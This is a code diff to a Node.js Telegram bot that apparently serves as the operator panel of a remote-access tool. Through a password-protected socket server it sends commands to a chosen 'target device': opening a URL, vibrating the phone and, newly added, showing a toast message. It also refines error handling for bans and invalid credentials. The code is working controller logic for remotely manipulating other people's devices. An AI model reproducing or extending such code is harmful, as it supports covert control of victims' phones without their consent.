@@ -355,7 +355,7 @@ bot.on('message', async (message) => {
                     me.on("data", async (data) => {
                         let _message = JSON.parse(data.toString());
                         if (_message.method == "getUserByDeviceId"){
-                            if (!_message.status && _message.message != "YOU_BANNED"){
+                            if (!_message.status && _message.message == "USER_NOT_FOUND"){
                                 await bot.sendMessage(
                                     message.chat.id,
                                     build("🔴 𓏺|𓏺 user not found"),
@@ -418,9 +418,9 @@ bot.on('message', async (message) => {
                             me.on("data", async (data) => {
                                 let _message = JSON.parse(data.toString());
                                 if (_message.method == "openUrl"){
-                                    if (!_message.status && _message.message != "YOU_BANNED"){
+                                    if (!_message.status && _message.message == "INVALID_PORT_OR_PASSWORD"){
                                         await bot.sendMessage(
-                                            build("🔴 𓏺|𓏺 user not found"),
+                                            build("🔴 𓏺|𓏺 invalid port or password detected"),
                                             {
                                                 message_id: rmsg.message_id,
                                                 chat_id: rmsg.chat.id
@@ -436,8 +436,15 @@ bot.on('message', async (message) => {
                                             }
                                         )
                                         delete steps[message.from.id.toString()]
+                                    } else if (!_message.status && _message.message == null){
+                                        await bot.editMessageText(
+                                            build(`🔴 ${sym} process didnt successful`),{
+                                                message_id: rmsg.message_id,
+                                                chat_id: rmsg.chat.id
+                                            }
+                                        )
                                     } else if (_message.status){
-                                        if (_message.user.device_id == devid){
+                                        if (_message.device_id == devid){
                                             await bot.editMessageText(
                                                 build(`📁 ${sym} link opened in target device\n🔗 ${sym} link: <code>${message.text}</code>\n📢 ${sym} device id: <code>${_message.user.device_id}</code>`),
                                                 {
@@ -445,7 +452,7 @@ bot.on('message', async (message) => {
                                                     chat_id: rmsg.chat.id
                                                 }
                                             )
-                                            delete steps[message.from.id.toString()]
+                                            delete steps[message.from.id.toString()];
                                         }
                                     }
                                 }
@@ -459,6 +466,76 @@ bot.on('message', async (message) => {
                                 reply_to_message_id: message.message_id
                             }
                         )
+                    }
+                } else if (mode == "getToast"){
+                    if (message.text.length > 20){
+                        await bot.sendMessage(
+                            message.chat.id,
+                            build(`🔴 ${sym} toast-message should be less than 20 charecters, try again`),
+                            {
+                                reply_to_message_id: message.message_id
+                            }
+                        )
+                    } else {
+                        await bot.sendMessage(
+                            message.chat.id,
+                            build(`🍷 ${sym} trying to send your toast-message ...`),
+                            {
+                                reply_to_message_id: message.message_id
+                            }
+                        ).then(async (rmsg) => {
+                            me.write(JSON.stringify({
+                                method: "sendToast",
+                                port: portname,
+                                password: passname,
+                                mask: "metro",
+                                device_id: devid,
+                                toast: message.text
+                            }));
+
+                            me.on("data", async (data) => {
+                                let _message = JSON.parse(data.toString());
+                                if (_message.method == "sendToast"){
+                                    if (!_message.status && _message.message == "INVALID_PORT_OR_PASSWORD"){
+                                        await bot.sendMessage(
+                                            build("🔴 𓏺|𓏺 invalid port or password detected"),
+                                            {
+                                                message_id: rmsg.message_id,
+                                                chat_id: rmsg.chat.id
+                                            }
+                                        )
+                                        delete steps[message.from.id.toString()]
+                                    } else if (!_message.status && _message.message == "YOU_BANNED"){
+                                        await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 sorry but you got banned"),
+                                            {
+                                                message_id: rmsg.message_id,
+                                                chat_id: rmsg.chat.id
+                                            }
+                                        )
+                                        delete steps[message.from.id.toString()]
+                                    } else if (!_message.status && _message.message == null){
+                                        await bot.editMessageText(
+                                            build(`🔴 ${sym} process didnt successful`),{
+                                                message_id: rmsg.message_id,
+                                                chat_id: rmsg.chat.id
+                                            }
+                                        )
+                                    } else if (_message.status){
+                                        if (_message.device_id == devid){
+                                            await bot.editMessageText(
+                                                build(`🎁 ${sym} your toast message showed on target device !`),
+                                                {
+                                                    message_id: rmsg.message_id,
+                                                    chat_id: rmsg.chat.id
+                                                }
+                                            )
+                                            delete steps[message.from.id.toString()]
+                                        }
+                                    }
+                                }
+                            })
+                        })
                     }
                 }
             }
@@ -600,7 +677,7 @@ bot.on("callback_query", async (call) => {
             me.on("data", async (data) => {
                 let _message = JSON.parse(data.toString());
                 if (_message.method == "getUserByDeviceId"){
-                    if (!_message.status && _message.message != "YOU_BANNED"){
+                    if (!_message.status && _message.message == "USER_NOT_FOUND"){
                         await bot.editMessageText(
                             build("🔴 𓏺|𓏺 user not found, its because the use disconnected suddenly"),
                             {
@@ -611,6 +688,14 @@ bot.on("callback_query", async (call) => {
                     } else if (!_message.status && _message.message == "YOU_BANNED"){
                         await bot.editMessageText(
                             build("🔴 𓏺|𓏺 sorry but you got banned"),
+                            {
+                                message_id: call.message.message_id,
+                                chat_id: call.message.chat.id
+                            }
+                        )
+                    } else if (!_message.status && _message.message == "INVALID_PORT_OR_PASSWORD"){
+                        await bot.editMessageText(
+                            build("🔴 𓏺|𓏺 invalid port or password detected"),
                             {
                                 message_id: call.message.message_id,
                                 chat_id: call.message.chat.id
@@ -649,7 +734,7 @@ bot.on("callback_query", async (call) => {
             me.on("data", async (data) => {
                 let _message = JSON.parse(data.toString());
                 if (_message.method == "getUserByDeviceId"){
-                    if (!_message.status && _message.message != "YOU_BANNED"){
+                    if (!_message.status && _message.message == "USER_NOT_FOUND"){
                         await bot.editMessageText(
                             build("🔴 𓏺|𓏺 user not found, its because the use disconnected suddenly"),
                             {
@@ -660,6 +745,14 @@ bot.on("callback_query", async (call) => {
                     } else if (!_message.status && _message.message == "YOU_BANNED"){
                         await bot.editMessageText(
                             build("🔴 𓏺|𓏺 sorry but you got banned"),
+                            {
+                                message_id: call.message.message_id,
+                                chat_id: call.message.chat.id
+                            }
+                        )
+                    }  else if (!_message.status && _message.message == "INVALID_PORT_OR_PASSWORD"){
+                        await bot.editMessageText(
+                            build("🔴 𓏺|𓏺 invalid port or password detected"),
                             {
                                 message_id: call.message.message_id,
                                 chat_id: call.message.chat.id
@@ -683,9 +776,9 @@ bot.on("callback_query", async (call) => {
                                 me.on("data", async (data) => {
                                     let _message = JSON.parse(data.toString());
                                     if (_message.method == "vibratePhone"){
-                                        if (!_message.status && _message.message != "YOU_BANNED"){
+                                        if (!_message.status && _message.message == "INVALID_PORT_OR_PASSWORD"){
                                             await bot.editMessageText(
-                                                build("🔴 𓏺|𓏺 user not found, its because the use disconnected suddenly"),
+                                                build("🔴 𓏺|𓏺 invalid port or password detected"),
                                                 {
                                                     message_id: call.message.message_id,
                                                     chat_id: call.message.chat.id
@@ -699,18 +792,84 @@ bot.on("callback_query", async (call) => {
                                                     chat_id: call.message.chat.id
                                                 }
                                             )
-                                        } else if (_message.status){
+                                        } else if (!_message.status && _message.message == null){
                                             await bot.editMessageText(
-                                                build(`🌂 ${sym} device vibrated: `) + devid,
-                                                {
+                                                build(`🔴 ${sym} process didnt successful`),{
                                                     message_id: call.message.message_id,
                                                     chat_id: call.message.chat.id
                                                 }
                                             )
+                                        } else if (_message.status){
+                                            if (_message.device_id == devid){
+                                                await bot.editMessageText(
+                                                    build(`🌂 ${sym} device vibrated: `) + devid,
+                                                    {
+                                                        message_id: call.message.message_id,
+                                                        chat_id: call.message.chat.id
+                                                    }
+                                                )
+                                            }
                                         }
                                     }
                                 })    
                             })
+                        }
+                    }
+                }
+            })
+        } else if (mode === "sendToast"){
+            let devid = spl[2];
+            me.write(JSON.stringify({
+                method: "getUserByDeviceId",
+                port: portname,
+                password: passname,
+                mask: "metro",
+                device_id: devid
+            }));
+
+            me.on("data", async (data) => {
+                let _message = JSON.parse(data.toString());
+                if (_message.method == "getUserByDeviceId"){
+                    if (!_message.status && _message.message == "USER_NOT_FOUND"){
+                        await bot.editMessageText(
+                            build("🔴 𓏺|𓏺 user not found, its because the use disconnected suddenly"),
+                            {
+                                message_id: call.message.message_id,
+                                chat_id: call.message.chat.id
+                            }
+                        )
+                    } else if (!_message.status && _message.message == "YOU_BANNED"){
+                        await bot.editMessageText(
+                            build("🔴 𓏺|𓏺 sorry but you got banned"),
+                            {
+                                message_id: call.message.message_id,
+                                chat_id: call.message.chat.id
+                            }
+                        )
+                    } else if (!_message.status && _message.message == "INVALID_PORT_OR_PASSWORD"){
+                        await bot.editMessageText(
+                            build("🔴 𓏺|𓏺 invalid port or password detected"),
+                            {
+                                message_id: call.message.message_id,
+                                chat_id: call.message.chat.id
+                            }
+                        )
+                    } else if (_message.status){
+                        if (_message.user.device_id == devid){
+                            Object.defineProperty(steps, uid, {
+                                configurable: true,
+                                enumerable: true,
+                                writable: true,
+                                value: `getToast_${devid}`
+                            })
+
+                            await bot.editMessageText(
+                                build(`🍂 ${sym} please send your message to show on target device`),
+                                {
+                                    message_id: call.message.message_id,
+                                    chat_id: call.message.chat.id
+                                }
+                            )
                         }
                     }
                 }
